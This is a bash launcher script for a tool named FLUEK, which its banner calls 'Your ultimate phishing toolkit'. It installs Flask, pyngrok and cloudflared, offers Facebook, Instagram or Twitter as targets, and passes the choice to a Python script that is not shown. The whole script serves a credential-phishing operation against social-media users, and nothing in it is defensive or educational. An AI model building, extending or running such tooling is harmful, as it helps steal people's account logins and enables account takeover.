#!/bin/bash

# Get the current directory where the script is running
SCRIPT_DIR=$(pwd)

# Check if Python and pip are installed
requirement_missing=false

# Check if python3 is installed
if ! command -v python3 &>/dev/null; then
    echo -e "\e[1;31mPython is not installed. Please install Python 3 first.\e[0m"
    requirement_missing=true
fi

# Check if pip3 is installed
if ! command -v pip3 &>/dev/null; then
    echo -e "\e[1;31mpip is not installed. Please install pip3 first.\e[0m"
    requirement_missing=true
fi

# Check and install Python dependencies
if [ "$requirement_missing" = false ]; then
    if ! pip3 show Flask &>/dev/null; then
        echo -e "\e[1;31mFlask is not installed. Installing...\e[0m"
        requirement_missing=true
    fi
    if ! pip3 show pyngrok &>/dev/null; then
        echo -e "\e[1;31mpyngrok is not installed. Installing...\e[0m"
        requirement_missing=true
    fi
    if ! pip3 show cloudflare &>/dev/null; then
        echo -e "\e[1;31mcloudflare is not installed. Installing...\e[0m"
        requirement_missing=true
    fi
fi

# Install Python dependencies if missing
if [ "$requirement_missing" = true ]; then
    echo -e "\e[1;33mInstalling required dependencies...\e[0m"
    cat <<EOF > requirements.txt
Flask
pyngrok
cloudflared
EOF
    pip3 install -r requirements.txt
    rm requirements.txt
fi

# Clear the terminal after all checks
clear

# Use ASCII Art for the "WELCOME TO FLUEK" banner (Large font)
echo -e "\e[1;36m#########################################################"
echo -e "\e[1;36m#                                                       #"
echo -e "\e[1;36m#              \e[1;33m   WELCOME TO FLUEK   \e[1;36m                   #"
echo -e "\e[1;36m#                                                       #"
echo -e "\e[1;36m#########################################################\e[0m"

# Additional text with colorful background and text
echo -e "\e[1;40m            \e[1;37mYour ultimate phishing toolkit\e[0m"
echo -e "\e[1;40m                       \e[1;31m©Degar69\e[0m"
echo -e "\e[1;40m   \e[1;33mVisit My YouTube Channel: @CodeXcellenceTutorials\e[0m"
echo -e "\e[1;36m#########################################################\e[0m"
echo -e

# Justified and colorful menu options
echo -e "\n\e[1;35mChoose Target:\e[0m"
echo ---------------------------------------------------------
# Menu options with colors
echo -e "\n\e[1;33m[1] Facebook      \e[1;34m[2] Instagram      \e[1;32m[3] Twitter      "
echo -e "\e[1;37m[0] Exit"
echo
echo -e "\e[1;36m#########################################################\e[0m"

# Get user input
read -p $'\e[1;37mSelect an option (1-3): \e[0m' choice

# Run the Python script with the selected choice
if [[ $choice =~ ^[1-3]$ ]]; then
    echo -e "\e[1;32mLaunching FLUEK with your selection...\e[0m"
    python3 fluek.py $choice
else
    echo -e "\e[1;31mExiting...\e[0m"
fi
